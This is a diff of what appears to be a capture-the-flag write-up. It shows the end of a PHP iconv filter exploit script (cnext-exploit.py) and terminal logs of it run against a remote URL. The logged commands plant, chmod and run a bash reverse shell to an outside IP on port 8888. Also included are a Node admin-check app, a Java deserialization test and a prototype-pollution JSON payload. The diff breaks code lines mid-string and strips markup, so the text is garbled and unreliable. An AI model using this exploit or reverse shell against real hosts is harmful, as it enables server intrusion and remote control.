             and region.stop & (HEAP_SIZE-1) == 0
-            and region.path in ("", "[anon:zend_alloc]")
+            and region.path in ("", "[anon:
+zend_alloc]")
         ]
 
         if not heaps:
@@ -3608,7 +3597,8 @@ class Exploit:
 
         resource = compress(compress(pages))
         resource = b64(resource)
-        resource = f"data:text/plain;base64,{resource.decode()}"
+        resource = f"data:
+text/plain;base64,{resource.decode()}"
 
         filters = [
             # Create buckets
@@ -3647,7 +3637,8 @@ class Exploit:
 
         try:
             self.remote.send(path)
-        except (ConnectionError, ChunkedEncodingError):
+        
+except (ConnectionError, ChunkedEncodingError):
             pass
       
         msg_print()
@@ -3681,7 +3672,8 @@ def compressed_bucket(data: bytes) -> bytes:
 def qpe(data: bytes) -> bytes:
     """Emulates quoted-printable-encode.
     """
-    return "".join(f"={x:02x}" for x in data).upper().encode()
+    return "".join(f"={x:
+02x}" for x in data).upper().encode()
 
 def ptr_bucket(*ptrs, size=None) -> bytes:
     """Creates a 0x8000 chunk that reveals pointers after every step has been ran."""
@@ -3723,7 +3715,8 @@ class Region:
         return self.stop - self.start
 
 Exploit()
- root@webn1ght:~/poc/php-filter-iconv-main# python3 cnext-exploit.py http://1.95.73.253/uploads/store/comment/20240928/111aaa.php 'echo "/bin/bash -c "bash -i >& /dev/tcp/112.124.59.213/8888 0>&1"" > /tmp/night'
+ root@webn1ght:~/poc/php-filter-iconv-main
+# python3 cnext-exploit.py http://1.95.73.253/uploads/store/comment/20240928/111aaa.php 'echo "/bin/bash -c "bash -i >& /dev/tcp/112.124.59.213/8888 0>&1"" > /tmp/night'
 [*] The data:// wrapper works
 [*] The php://filter/ wrapper works
 [*] The zlib extension is enabled
@@ -3733,7 +3726,8 @@ Exploit()
 
      EXPLOIT  SUCCESS 
 
-root@webn1ght:~/poc/php-filter-iconv-main# python3 cnext-exploit.py http://1.95.73.253/uploads/store/comment/20240928/111aaa.php 'chmod +x /tmp/night'
+root@webn1ght:~/poc/php-filter-iconv-main
+# python3 cnext-exploit.py http://1.95.73.253/uploads/store/comment/20240928/111aaa.php 'chmod +x /tmp/night'
 [*] The data:// wrapper works
 [*] The php://filter/ wrapper works
 [*] The zlib extension is enabled
@@ -3743,18 +3737,14 @@ root@webn1ght:~/poc/php-filter-iconv-main# python3 cnext-exploit.py http://1.
 
      EXPLOIT  SUCCESS 
 
-root@webn1ght:~/poc/php-filter-iconv-main# python3 cnext-exploit.py http://1.95.73.253/uploads/store/comment/20240928/111aaa.php 'bash /tmp/night'
+root@webn1ght:~/poc/php-filter-iconv-main
+# python3 cnext-exploit.py http://1.95.73.253/uploads/store/comment/20240928/111aaa.php 'bash /tmp/night'
 [*] The data:// wrapper works
 [*] The php://filter/ wrapper works
 [*] The zlib extension is enabled
 [+] Exploit preconditions are satisfied
 [*] Using 0x7f1ce1e00040 as heap
 [!] Could not populate PLT: Invalid argument (UC_ERR_ARG)
-```
-
-
-
-```
 const express = require('express');
 const fs = require('fs');
 var nodeRsa = require('node-rsa');
@@ -3839,7 +3829,8 @@ function verifyAdmin(req, res, next) {
 }
 
 app.get('/hello', verifyAdmin ,(req, res)=> {
-  res.send('<h1>Welcome Admin!!!</h1><br><img src="./1.jpeg" />');
+  res.send('<h1>Welcome Admin!!!</h1>
+');
 });
 
 app.get('/config', (req, res) => {
@@ -3957,13 +3948,9 @@ app.get("/VanZY_s_T3st", (req, res) => {
 })
 
 app.listen(3000, () => {
-  console.log('Server running on http://localhost:3000');
+  console.log('Server running on http://localhost:
+3000');
 });
-```
-
-
-
-```
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.util.Base64;
@@ -3985,11 +3972,6 @@ public class Test {
         System.out.println(new String(out.toByteArray()));
     }
 }
-```
-
-
-
-```
 {
   "dependencies": {
     "body-parser": "^1.20.3",
@@ -4010,90 +3992,32 @@ public class Test {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Report Submission</title>
 
-    <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
-            color: #333;
-            line-height: 1.6;
-            padding: 20px;
-        }
-        h1 {
-            text-align: center;
-            margin-bottom: 20px;
-            color: #333;
-        }
-        .container {
-            max-width: 600px;
-            margin: 0 auto;
-            background-color: #fff;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
-        }
-        label {
-            font-weight: bold;
-            display: block;
-            margin-bottom: 10px;
-        }
-        input[type="text"], textarea {
-            width: 100%;
-            padding: 10px;
-            margin-bottom: 20px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-        }
-        textarea {
-            resize: vertical;
-        }
-        button {
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            padding: 12px 20px;
-            font-size: 16px;
-            cursor: pointer;
-            border-radius: 4px;
-            width: 100%;
-        }
-        button:hover {
-            background-color: #45a049;
-        }
-        .report-count {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-    </style>
+    
 </head>
-<body>
+
 <h1>Submit a Report</h1>
 
-<div class="container">
-    <div class="report-count">
-        <p>Current number of reports: <span id="report-count">Loading...</span></p>
-    </div>
+
+    
+        Current number of reports: Loading...
+    
 
     <form action="/report" method="POST">
-        <div class="form-group">
+        
             <label for="user">User:</label>
-            <input type="text" id="user" name="user" required>
-        </div>
+            
+        
 
-        <input type="hidden" id="date" name="date">
+        
 
-        <div class="form-group">
+        
             <label for="reportmessage">Report Message:</label>
             <textarea id="reportmessage" name="reportmessage" rows="6" required></textarea>
-        </div>
+        
 
-        <button type="submit">Submit Report</button>
+        Submit Report
     </form>
-</div>
+
 
 <script>
     window.onload = function() {
@@ -4117,13 +4041,8 @@ public class Test {
             });
     };
 </script>
-</body>
+
 </html>
-```
-
-
-
-```
 {
 "user":"__proto__",
 "date":2,
@@ -4138,27 +4057,19 @@ public class Test {
         }
     }
 }
-```
-
-
-
-```
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>像素图渲染</title>
-    <style>
-    ......
-    ......
-    </style>
+    
 </head>
-<body>
-    <div class="pixel-wrap">
-        <div class="pixel"></div>
-    </div>
-</body>
+
+    
+        
+    
+
 </html>
 ```
 
